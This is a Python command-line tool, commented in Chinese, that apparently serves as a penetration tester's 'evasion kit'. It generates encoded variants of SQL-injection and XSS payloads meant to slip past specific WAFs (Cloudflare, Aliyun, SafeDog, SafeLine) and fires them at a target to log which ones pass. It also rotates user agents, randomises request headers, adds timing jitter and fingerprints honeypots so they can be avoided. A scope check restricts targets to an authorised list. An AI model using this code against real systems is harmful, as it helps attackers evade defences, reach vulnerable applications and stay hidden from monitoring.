#!/usr/bin/env python3
"""授权目标上的对抗规避辅助：UA 轮换、编码变形、时序抖动、沙箱检测。

示例:
  python3 tools/evasion-kit/evasion.py doctor
  python3 tools/evasion-kit/evasion.py ua-pool [--count 5]
  python3 tools/evasion-kit/evasion.py encode --payload "' OR 1=1--" --waf cloudflare
  python3 tools/evasion-kit/evasion.py matrix --payload "<payload>" --url https://授权站 --case <案卷>
  python3 tools/evasion-kit/evasion.py sandbox-detect --url https://授权站 --case <案卷>
"""
from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

def _kit_ops_dir(start: Path) -> Path:
    here = start.resolve()
    if here.is_file():
        here = here.parent
    for p in (here, *here.parents):
        fang = p / "炼蛊房"
        if (fang / "scope_lib.py").is_file():
            return fang
        ops = p / "tools" / "ops"
        if (ops / "scope_lib.py").is_file():
            return ops
    return here

OPS = _kit_ops_dir(Path(__file__))
ENGINE = Path(__file__).resolve().parents[2]
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = (ENGINE / "案卷" if (ENGINE / "案卷").is_dir() else ENGINE / "exports" / "bot-recovery") / case / "测绘" / "evasion"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围")


# ─────────────────────────────────────────────
#  UA 池
# ─────────────────────────────────────────────
UA_POOL = [
    # Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    # Curl / Scanner 指纹（某些 WAF 白名单爬虫）
    "curl/8.7.1",
    "python-httpx/0.27.0",
]


def random_ua() -> str:
    return random.choice(UA_POOL)


# ─────────────────────────────────────────────
#  编码变形矩阵
# ─────────────────────────────────────────────
def encode_variants(payload: str, waf: str = "generic") -> list[dict]:
    """生成给定 payload 的编码变体列表。"""
    import urllib.parse

    variants: list[dict] = []

    def add(label: str, val: str) -> None:
        variants.append({"label": label, "value": val})

    # 原始
    add("raw", payload)
    # URL 编码
    add("url-encode", urllib.parse.quote(payload, safe=""))
    # 双 URL 编码
    add("double-url-encode", urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
    # 大写 hex %XX
    add("url-encode-upper", "".join(f"%{ord(c):02X}" if not c.isalnum() else c for c in payload))
    # Unicode 全角替换（针对 SafeLine / ModSecurity）
    full_width = payload.translate(str.maketrans(
        '\'<>()=;', '＇＜＞（）＝；'
    ))
    if full_width != payload:
        add("fullwidth", full_width)
    # 云审计/WAF：零宽与同形字（授权 payload 变体，不是越狱人设）
    zwsp = "\u200b".join(payload)
    if zwsp != payload:
        add("zwsp", zwsp)
    homo = payload.translate(str.maketrans("aeostAEOST", "аеоѕтАЕОЅТ"))
    if homo != payload:
        add("homoglyph", homo)
    # 注释插入（MySQL/PostgreSQL）
    if "select" in payload.lower() or "union" in payload.lower():
        add("comment-insert", payload.replace(" ", "/**/"))
        add("inline-comment", payload.replace(" ", " /*!*/ "))
    # 换行绕过（%0a）
    add("newline-inject", payload.replace(" ", "%0a"))
    # 大小写混淆
    add("case-mix", "".join(
        c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
    ))
    # HTML 实体（XSS payload）
    if "<" in payload or ">" in payload:
        add("html-entity", payload.replace("<", "&lt;").replace(">", "&gt;"))
        add("html-decimal", payload.replace("<", "&#60;").replace(">", "&#62;"))
        add("html-hex", payload.replace("<", "&#x3c;").replace(">", "&#x3e;"))
    # WAF 专项
    if waf == "cloudflare":
        add("cf-chunk-header", payload)  # 依赖 Transfer-Encoding: chunked
        add("cf-path-dots", "../" + payload)
    elif waf in ("aliyun", "safedog"):
        add("aliyun-unicode", payload.replace("'", "%u0027").replace(" ", "%u0020"))
    elif waf == "safeline":
        add("safeline-multipart", payload)  # 走 multipart/form-data 绕过
    return variants


# ─────────────────────────────────────────────
#  时序抖动
# ─────────────────────────────────────────────
def jitter_sleep(base_ms: int = 1000, variance_pct: float = 0.3) -> float:
    """随机睡眠 base_ms ± variance_pct，返回实际睡眠秒数。"""
    lo = base_ms * (1 - variance_pct)
    hi = base_ms * (1 + variance_pct)
    ms = random.uniform(lo, hi)
    time.sleep(ms / 1000)
    return ms / 1000


# ─────────────────────────────────────────────
#  沙箱 / 蜜罐检测
# ─────────────────────────────────────────────
HONEYPOT_HEADERS = {
    "X-Iorgafilemanager",
    "X-Powered-By-Plesk",
    "X-Honeypot",
    "X-Canary",
    "X-Trap",
    "X-Deception",
}

SANDBOX_INDICATORS = [
    "honeypot",
    "canary",
    "tarpit",
    "glastopf",
    "cowrie",
    "dionaea",
    "opencanary",
    "thinkst",
]

def detect_honeypot(url: str, timeout: float = 10.0, case: str = "") -> dict:
    import requests

    result = {
        "ts": _now(),
        "url": url,
        "verdict": "clean",
        "indicators": [],
    }
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False,
                         headers={"User-Agent": random_ua()})
        # 检查异常响应头
        for h in r.headers:
            if h in HONEYPOT_HEADERS:
                result["indicators"].append(f"suspicious header: {h}")
        # 检查响应内容指纹
        body_lower = (r.text or "")[:5000].lower()
        for ind in SANDBOX_INDICATORS:
            if ind in body_lower:
                result["indicators"].append(f"body keyword: {ind}")
        # 超快响应 < 5ms 通常是蜜罐直接返回
        # 检查 server 头
        server = r.headers.get("Server", "")
        if any(x in server.lower() for x in ("nginx/0.", "apache/0.", "fake")):
            result["indicators"].append(f"suspicious server: {server}")
        # 所有请求返回 200 且内容一致（蜜罐特征）
        r2 = requests.get(url + "/____nonexistent____xyz", timeout=timeout,
                          verify=False, headers={"User-Agent": random_ua()})
        if r2.status_code == 200 and len(r2.text) == len(r.text):
            result["indicators"].append("same-body-on-404: possible honeypot")
    except Exception as exc:
        result["indicators"].append(f"error: {exc}")

    if result["indicators"]:
        result["verdict"] = "suspicious"
    if case:
        out = case_dir(case) / "sandbox_detect.json"
        out.write_text(json.dumps(result, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        result["evidence"] = str(out)
    return result


# ─────────────────────────────────────────────
#  请求头随机化
# ─────────────────────────────────────────────
def random_headers(extra: dict | None = None) -> dict:
    headers = {
        "User-Agent": random_ua(),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
            "*/*",
        ]),
        "Accept-Language": random.choice([
            "zh-CN,zh;q=0.9,en;q=0.8",
            "en-US,en;q=0.9",
            "zh-TW,zh;q=0.9",
        ]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
        "Connection": "keep-alive",
    }
    if extra:
        headers.update(extra)
    return {k: v for k, v in headers.items() if v}


# ─────────────────────────────────────────────
#  命令实现
# ─────────────────────────────────────────────
def cmd_doctor(_: argparse.Namespace) -> int:
    import requests  # noqa: F401
    print("[ok] requests available")
    print(f"[ok] UA pool size: {len(UA_POOL)}")
    print("[ok] evasion-kit ready")
    return 0


def cmd_ua_pool(args: argparse.Namespace) -> int:
    pool = [random_ua() for _ in range(args.count)]
    print(json.dumps(pool, ensure_ascii=False, indent=2))
    return 0


def cmd_encode(args: argparse.Namespace) -> int:
    variants = encode_variants(args.payload, waf=args.waf)
    print(json.dumps({"payload": args.payload, "waf": args.waf, "variants": variants},
                     ensure_ascii=False, indent=2))
    return 0


def cmd_matrix(args: argparse.Namespace) -> int:
    """对目标 URL 尝试 payload 的所有变体，记录哪些被拦 / 放行。"""
    import requests

    ensure_scope(args.url)
    variants = encode_variants(args.payload, waf=args.waf)
    results = []
    for v in variants:
        try:
            params = {args.param: v["value"]}
            r = requests.get(
                args.url,
                params=params,
                headers=random_headers(),
                timeout=args.timeout,
                verify=not args.insecure,
            )
            blocked = r.status_code in (403, 406, 429, 444, 503)
            results.append({
                "label": v["label"],
                "value": v["value"],
                "status": r.status_code,
                "blocked": blocked,
                "body_len": len(r.content),
            })
        except Exception as exc:
            results.append({"label": v["label"], "value": v["value"], "error": str(exc)})
        jitter_sleep(args.delay_ms, 0.4)

    passed = [r for r in results if not r.get("blocked") and "error" not in r]
    report = {
        "ts": _now(),
        "url": args.url,
        "payload": args.payload,
        "waf": args.waf,
        "total": len(variants),
        "passed": len(passed),
        "results": results,
    }
    out_dir = case_dir(args.case)
    out = out_dir / "bypass_matrix.json"
    out.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    report["evidence"] = str(out)
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"\n[result] {len(passed)}/{len(variants)} variants passed WAF", flush=True)
    return 0 if passed else 2


def cmd_sandbox_detect(args: argparse.Namespace) -> int:
    ensure_scope(args.url)
    result = detect_honeypot(args.url, timeout=args.timeout, case=args.case)
    print(json.dumps(result, ensure_ascii=False, indent=2))
    print(f"\n[verdict] {result['verdict']} — indicators: {len(result['indicators'])}")
    return 0 if result["verdict"] == "clean" else 1


def cmd_headers(args: argparse.Namespace) -> int:
    h = random_headers()
    print(json.dumps(h, ensure_ascii=False, indent=2))
    return 0


# ─────────────────────────────────────────────
#  WAF 绕过 payload 库（来源：72stack-sec）
# ─────────────────────────────────────────────
def cmd_waf_lookup(args: argparse.Namespace) -> int:
    """从 72stack-sec waf-bypass.md 提取对应类型的绕过 payload。"""
    _72_base = ENGINE / ".cursor" / "skills" / "72stack-sec"
    waf_file = _72_base / "references" / "payloader" / "waf-bypass.md"
    if not waf_file.exists():
        print(f"[waf-lookup] 找不到 {waf_file}，请确认 72stack-sec 已克隆")
        return 1

    text = waf_file.read_text(encoding="utf-8")
    lines = text.splitlines()

    type_q = (args.type or "").lower()
    keyword_q = (args.keyword or "").lower()

    if not type_q and not keyword_q:
        # 列出所有 section 标题
        print("\n[waf-lookup] waf-bypass.md 章节列表（用 --type 或 --keyword 检索）\n")
        for line in lines:
            if line.startswith("#"):
                print(" ", line)
        return 0

    # 提取匹配的段落
    results: list[str] = []
    in_section = False
    current_section: list[str] = []
    current_title = ""

    for line in lines:
        if line.startswith("#"):
            # 保存上一段
            if in_section and current_section:
                results.append("\n".join(current_section))
            # 判断新段
            title_lower = line.lower()
            in_section = (type_q and type_q in title_lower) or (
                keyword_q and keyword_q in title_lower
            )
            current_title = line
            current_section = [line]
        else:
            if in_section:
                current_section.append(line)
                # 如果 keyword 在正文里也匹配
            elif keyword_q and keyword_q in line.lower():
                results.append(f"[命中行] {line.strip()}")

    if in_section and current_section:
        results.append("\n".join(current_section))

    if not results:
        print(f"[waf-lookup] 未命中 type='{type_q}' keyword='{keyword_q}'")
        print("  用 --type '' 列出所有章节")
        return 1

    limit = args.limit
    shown = results[:limit]
    print(f"\n[waf-lookup] 命中 {len(results)} 段（显示 {len(shown)}）| 来源: 72stack-sec/waf-bypass.md\n")
    print("\n\n".join(shown))
    if len(results) > limit:
        print(f"\n… 还有 {len(results) - limit} 段，加 --limit 参数")
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description="对抗规避辅助（授权闸门）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor")
    d.set_defaults(func=cmd_doctor)

    ua = sub.add_parser("ua-pool", help="随机 UA 列表")
    ua.add_argument("--count", type=int, default=5)
    ua.set_defaults(func=cmd_ua_pool)

    enc = sub.add_parser("encode", help="payload 编码变体")
    enc.add_argument("--payload", required=True)
    enc.add_argument("--waf", default="generic",
                     choices=["generic", "cloudflare", "aliyun", "safedog", "safeline"])
    enc.set_defaults(func=cmd_encode)

    mat = sub.add_parser("matrix", help="在授权目标上测试 bypass 变体")
    mat.add_argument("--url", required=True)
    mat.add_argument("--payload", required=True)
    mat.add_argument("--param", default="q", help="注入参数名")
    mat.add_argument("--waf", default="generic")
    mat.add_argument("--case", required=True)
    mat.add_argument("--delay-ms", type=int, default=800, help="请求间隔基准 ms")
    mat.add_argument("--timeout", type=float, default=20.0)
    mat.add_argument("--insecure", action="store_true")
    mat.set_defaults(func=cmd_matrix)

    sd = sub.add_parser("sandbox-detect", help="蜜罐/沙箱特征检测")
    sd.add_argument("--url", required=True)
    sd.add_argument("--case", default="")
    sd.add_argument("--timeout", type=float, default=10.0)
    sd.set_defaults(func=cmd_sandbox_detect)

    hd = sub.add_parser("headers", help="生成随机化请求头")
    hd.set_defaults(func=cmd_headers)

    wl = sub.add_parser("waf-lookup", help="查 72stack-sec WAF 绕过 payload 库")
    wl.add_argument("--type", "-t", default="", help="按章节类型筛选（如 sqli / xss / rce）")
    wl.add_argument("--keyword", "-k", default="", help="关键词搜索")
    wl.add_argument("--limit", type=int, default=5, help="显示段落数（默认 5）")
    wl.set_defaults(func=cmd_waf_lookup)

    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
